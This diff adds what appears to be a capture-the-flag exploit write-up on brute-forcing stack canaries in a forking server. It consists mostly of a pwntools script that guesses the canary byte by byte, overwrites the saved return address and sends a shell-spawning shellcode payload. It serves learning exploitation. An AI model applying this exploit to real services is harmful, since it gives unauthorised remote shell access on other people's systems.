@@ -1,0 +1,34 @@
+This time stack canary brute forcing. We get to overflow the stack of a child process with a string. Since each child process has the same stack cookie and we can choose to only overwrite one byte at a time we can brute force each byte individually. Then overwrite the stack with the correct cookie and shellcode.
+
+cookie  = b''              
+for i in range(0, 8):
+    for b in range(256):
+        if b==10:
+            continue
+        guess = cookie + p8(b)
+        print(list(guess))
+        if tries(guess):
+            cookie = guess
+            log.success(f'new cookie = {cookie.hex()}')
+            break
+
+
+shellcode = asm(shellcraft.sh())
+
+offset_to_shellcode = 200 + len(cookie) + len(junk) + 32
+sc_addr = addr + offset_to_shellcode
+log.info(f"shellcode will be at {hex(sc_addr)}")
+
+payload  = flat(
+    PAD,
+    cookie,
+    junk,
+    p64(sc_addr),            # overwrite saved RIP → jump to SC
+    asm('nop')*64,           # NOP sled, optional
+    shellcode
+)
+
+print(payload)
+
+io.sendline(payload)
+io.interactive()
